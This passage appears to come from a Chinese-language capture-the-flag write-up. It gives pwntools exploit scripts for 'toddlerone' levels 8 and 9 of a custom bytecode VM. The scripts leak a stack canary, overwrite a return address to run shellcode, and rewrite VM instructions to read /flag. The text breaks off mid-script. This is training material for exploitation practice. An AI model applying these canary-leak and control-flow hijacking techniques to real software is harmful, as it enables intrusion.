<span class="token operator">|</span> 0x00007ffd2a17a3d8 <span class="token punctuation">(</span>rsp+0x0018<span class="token punctuation">)</span> <span class="token operator">|</span> 00 00 00 00 00 00 00 00 <span class="token operator">|</span> 0x0000000000000000 <span class="token operator">|</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python">
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level8.1"</span><span class="token punctuation">)</span>

<span class="token triple-quoted-string string">"""
op arg1 arg2-------op vaules register

SYS \x08            exit --0x01   read 0x20 write 0x04
IMM \x04     

a 0x40
b 0x01
c 0x08
i 0x10

"""</span>
shellcode_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level7/shellcode.bin"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span>
shellcode <span class="token operator">=</span> shellcode_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level8.1"</span><span class="token punctuation">)</span>
data_list <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">b'\x04\x01\x40'</span> <span class="token comment"># IMM a= \x01</span>
    <span class="token string">b'\x04\xFF\x01'</span> <span class="token comment"># IMM b = \xFF</span>
    <span class="token string">b'\x04\x31\x08'</span> <span class="token comment"># IMM c = \x31</span>
    <span class="token string">b'\x08\x40\x04'</span> <span class="token comment"># write  返回值是a</span>

    <span class="token string">b'\x04\x00\x40'</span> <span class="token comment"># IMM a= \x00</span>
    <span class="token string">b'\x04\xFF\x01'</span> <span class="token comment"># IMM b = \xFF</span>
    <span class="token string">b'\x04\x21\x08'</span> <span class="token comment"># IMM c = \x21</span>
    <span class="token string">b'\x08\x40\x20'</span> <span class="token comment"># read  返回值是a</span>
    <span class="token string">b'\x04\xFF\x10'</span> <span class="token comment"># IMM i = \xFF</span>
<span class="token punctuation">]</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your yancode:"</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> data_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> shellcode
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
return_print <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 因为yancode中的write 写入的是字节，他没有在最后增加\n，所以readline始终是读不到值的</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>return_print<span class="token punctuation">)</span>
canary_value <span class="token operator">=</span> return_print<span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span>
stack_value  <span class="token operator">=</span> return_print<span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">*</span><span class="token number">6</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>canary_value<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span>
stack_value <span class="token operator">=</span> u64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">b'\xFF'</span><span class="token operator">+</span> <span class="token string">b'\xFF'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>u64<span class="token punctuation">(</span>canary_value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\xFF'</span><span class="token operator">*</span><span class="token number">8</span>  <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_value <span class="token operator">-</span> <span class="token number">0xF8</span> <span class="token operator">-</span><span class="token number">0x410</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> <span class="token string">"pwn"</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>
exit<span class="token punctuation">(</span><span class="token punctuation">)</span>





<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level8.0"</span><span class="token punctuation">)</span>

<span class="token triple-quoted-string string">"""
arg1 arg2 op  register values op

SYS \x04            exit --0x20   read 0x10 write 0x4
IMM \x08     

a 0x10
b 0x02
c 0x08
i 0x20

"""</span>
shellcode_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level7/shellcode.bin"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span>
shellcode <span class="token operator">=</span> shellcode_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level8.0"</span><span class="token punctuation">)</span>
data_list <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">b'\x10\x01\x08'</span> <span class="token comment"># IMM a= \x01</span>
    <span class="token string">b'\x02\xFF\x08'</span> <span class="token comment"># IMM b = \xFF</span>
    <span class="token string">b'\x08\x31\x08'</span> <span class="token comment"># IMM c = \x31</span>
    <span class="token string">b'\x04\x10\x04'</span> <span class="token comment"># write  返回值是a</span>

    <span class="token string">b'\x10\x00\x08'</span> <span class="token comment"># IMM a= \x00</span>
    <span class="token string">b'\x02\xFF\x08'</span> <span class="token comment"># IMM b = \xFF</span>
    <span class="token string">b'\x08\x21\x08'</span> <span class="token comment"># IMM c = \x21</span>
    <span class="token string">b'\x10\x10\x04'</span> <span class="token comment"># read  返回值是a</span>
    <span class="token string">b'\x20\xFF\x08'</span> <span class="token comment"># IMM i = \xFF</span>
<span class="token punctuation">]</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your yancode:"</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> data_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> shellcode
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"[s] ... write\n"</span><span class="token punctuation">)</span>
return_print <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
canary_value <span class="token operator">=</span> return_print<span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span>
stack_value  <span class="token operator">=</span> return_print<span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">*</span><span class="token number">6</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>canary_value<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span>
stack_value <span class="token operator">=</span> u64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">b'\xFF'</span><span class="token operator">+</span> <span class="token string">b'\xFF'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>u64<span class="token punctuation">(</span>canary_value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\xFF'</span><span class="token operator">*</span><span class="token number">8</span>  <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_value <span class="token operator">-</span> <span class="token number">0xF8</span> <span class="token operator">-</span><span class="token number">0x410</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> <span class="token string">"pwn"</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>这一关，不再是使用栈溢出覆盖返回地址劫持控制流了。而是直接复写指令，绕过检查，然后在标准输出中打印 <code>flag</code>。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token triple-quoted-string string">"""
/flag  ---> 2f 66 6c 61 67

arg1        op      arg2
register            value
syscall 

a   0x8
b   0x20
c   0x2
d   0x1
s   0x10
i   0x40
f   0x04

read    0x2
write   0x4
open    0x10
exit    0x8
"""</span>

<span class="token keyword">def</span> <span class="token function">format_data_list</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> read<span class="token punctuation">,</span> write<span class="token punctuation">,</span> stm<span class="token punctuation">,</span> open_<span class="token punctuation">,</span> imm<span class="token punctuation">,</span> sys<span class="token punctuation">)</span><span class="token punctuation">:</span>
    formatted_data_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> item <span class="token keyword">in</span> data_list<span class="token punctuation">:</span>
        formatted_item <span class="token operator">=</span> item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;c&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;sys&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>sys<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;read&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>read<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;write&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>write<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;open&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>open_<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;stm&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>stm<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>imm<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        formatted_data_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>formatted_item<span class="token punctuation">)</span>
    <span class="token keyword">return</span> formatted_data_list

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level9.0"</span><span class="token punctuation">)</span>

data_list <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">b'\&#123;a&#125;\&#123;imm&#125;\x00'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x00</span>
    <span class="token string">b'\&#123;b&#125;\&#123;imm&#125;\xff'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0xff</span>
    <span class="token string">b'\&#123;c&#125;\&#123;imm&#125;\xff'</span><span class="token punctuation">,</span> <span class="token comment"># imm c, 0xff</span>
    <span class="token string">b'\&#123;read&#125;\&#123;sys&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># read(a, b  ,c) ---> return a</span>
<span class="token punctuation">]</span>

<span class="token comment"># Operation: stm=128, Registers:  a=64, b=2, c=4, sys: read=8, write=16, open=4</span>
payload_1 <span class="token operator">=</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>format_data_list<span class="token punctuation">(</span>a<span class="token operator">=</span><span class="token number">0x8</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token number">0x2</span><span class="token punctuation">,</span>read<span class="token operator">=</span><span class="token number">0x2</span><span class="token punctuation">,</span>write<span class="token operator">=</span><span class="token number">0x4</span><span class="token punctuation">,</span>open_<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">,</span>stm<span class="token operator">=</span><span class="token number">0x01</span><span class="token punctuation">,</span>imm<span class="token operator">=</span><span class="token number">0x02</span><span class="token punctuation">,</span> sys<span class="token operator">=</span><span class="token number">0x04</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

data_list <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">b'\xff'</span>             <span class="token comment"># 填充FF位置</span>
    <span class="token string">b'\xff\xff\xff'</span><span class="token punctuation">,</span>    <span class="token comment"># 填充第1条指令</span>
    <span class="token string">b'\xff\xff\xff'</span><span class="token punctuation">,</span>    <span class="token comment"># 填充第2条指令</span>
    <span class="token string">b'\xff\xff\xff'</span><span class="token punctuation">,</span>    <span class="token comment"># 填充第3条指令</span>
    <span class="token string">b'\xff\xff\xff'</span><span class="token punctuation">,</span>    <span class="token comment"># 填充第4条指令</span>

    <span class="token string">b'\&#123;a&#125;\&#123;imm&#125;\x00'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x00</span>
    <span class="token string">b'\&#123;b&#125;\&#123;imm&#125;\x2f'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x2f</span>
    <span class="token string">b'\&#123;a&#125;\&#123;stm&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>

    <span class="token string">b'\&#123;a&#125;\&#123;imm&#125;\x01'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x01</span>
    <span class="token string">b'\&#123;b&#125;\&#123;imm&#125;\x66'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x66</span>
    <span class="token string">b'\&#123;a&#125;\&#123;stm&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>

    <span class="token string">b'\&#123;a&#125;\&#123;imm&#125;\x02'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x02</span>
    <span class="token string">b'\&#123;b&#125;\&#123;imm&#125;\x6c'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x6c</span>
    <span class="token string">b'\&#123;a&#125;\&#123;stm&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>

    <span class="token string">b'\&#123;a&#125;\&#123;imm&#125;\x03'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x03</span>
    <span class="token string">b'\&#123;b&#125;\&#123;imm&#125;\x61'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x61</span>
    <span class="token string">b'\&#123;a&#125;\&#123;stm&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>

    <span class="token string">b'\&#123;a&#125;\&#123;imm&#125;\x04'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x04</span>
    <span class="token string">b'\&#123;b&#125;\&#123;imm&#125;\x67'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x67</span>
    <span class="token string">b'\&#123;a&#125;\&#123;stm&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>

    <span class="token string">b'\&#123;a&#125;\&#123;imm&#125;\x00'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x00</span>
    <span class="token string">b'\&#123;b&#125;\&#123;imm&#125;\x00'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x00</span>
    <span class="token string">b'\&#123;open&#125;\&#123;sys&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># open ---> return a</span>

    <span class="token string">b'\&#123;b&#125;\&#123;imm&#125;\x10'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x10</span>
    <span class="token string">b'\&#123;c&#125;\&#123;imm&#125;\x40'</span><span class="token punctuation">,</span> <span class="token comment"># imm c, 0x40</span>
    <span class="token string">b'\&#123;read&#125;\&#123;sys&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># read(a, b, c) ---> return a</span>

    <span class="token string">b'\&#123;a&#125;\&#123;imm&#125;\x01'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x01</span>
    <span class="token string">b'\&#123;write&#125;\&#123;sys&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># write(a, b, c) ---> return a</span>

    <span class="token string">b'\&#123;a&#125;\&#123;imm&#125;\x00'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x00</span>
    <span class="token string">b'\x08\&#123;sys&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># exit(a)</span>

<span class="token punctuation">]</span>

payload_2 <span class="token operator">=</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>format_data_list<span class="token punctuation">(</span>a<span class="token operator">=</span><span class="token number">0x8</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token number">0x2</span><span class="token punctuation">,</span>read<span class="token operator">=</span><span class="token number">0x2</span><span class="token punctuation">,</span>write<span class="token operator">=</span><span class="token number">0x4</span><span class="token punctuation">,</span>open_<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">,</span>stm<span class="token operator">=</span><span class="token number">0x01</span><span class="token punctuation">,</span>imm<span class="token operator">=</span><span class="token number">0x02</span><span class="token punctuation">,</span> sys<span class="token operator">=</span><span class="token number">0x04</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level9.0"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload_1<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload_2<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>9.1 就是调整一下顺序。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token triple-quoted-string string">"""
/flag  ---> 2f 66 6c 61 67

imm 0x2
stm 0x40
sys 0x10

op      arg1        arg2
        register    value
        syscall   

a   0x2
b   0x40
c   0x1
d   0x10
s   0x20
i   0x4
f   0x8

read    0x08
write   0x01
open    0x10
exit    0x02
"""</span>

<span class="token keyword">def</span> <span class="token function">format_data_list</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> read<span class="token punctuation">,</span> write<span class="token punctuation">,</span> stm<span class="token punctuation">,</span> open_<span class="token punctuation">,</span> imm<span class="token punctuation">,</span> sys<span class="token punctuation">)</span><span class="token punctuation">:</span>
    formatted_data_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> item <span class="token keyword">in</span> data_list<span class="token punctuation">:</span>
        formatted_item <span class="token operator">=</span> item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;c&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;sys&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>sys<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;read&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>read<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;write&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>write<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;open&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>open_<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;stm&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>stm<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>imm<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        formatted_data_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>formatted_item<span class="token punctuation">)</span>
    <span class="token keyword">return</span> formatted_data_list

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level9.1"</span><span class="token punctuation">)</span>

data_list <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;\x00'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x00</span>
    <span class="token string">b'\&#123;imm&#125;\&#123;b&#125;\xff'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0xff</span>
    <span class="token string">b'\&#123;imm&#125;\&#123;c&#125;\xff'</span><span class="token punctuation">,</span> <span class="token comment"># imm c, 0xff</span>
    <span class="token string">b'\&#123;sys&#125;\&#123;read&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># read(a, b  ,c) ---> return a</span>
<span class="token punctuation">]</span>

<span class="token comment"># Operation: stm=128, Registers:  a=64, b=2, c=4, sys: read=8, write=16, open=4</span>
payload_1 <span class="token operator">=</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>format_data_list<span class="token punctuation">(</span>a<span class="token operator">=</span><span class="token number">0x2</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">0x40</span><span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token number">0x1</span><span class="token punctuation">,</span>read<span class="token operator">=</span><span class="token number">0x8</span><span class="token punctuation">,</span>write<span class="token operator">=</span><span class="token number">0x1</span><span class="token punctuation">,</span>open_<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">,</span>stm<span class="token operator">=</span><span class="token number">0x40</span><span class="token punctuation">,</span>imm<span class="token operator">=</span><span class="token number">0x2</span><span class="token punctuation">,</span> sys<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

data_list <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">b'\xff'</span>             <span class="token comment"># 填充FF位置</span>
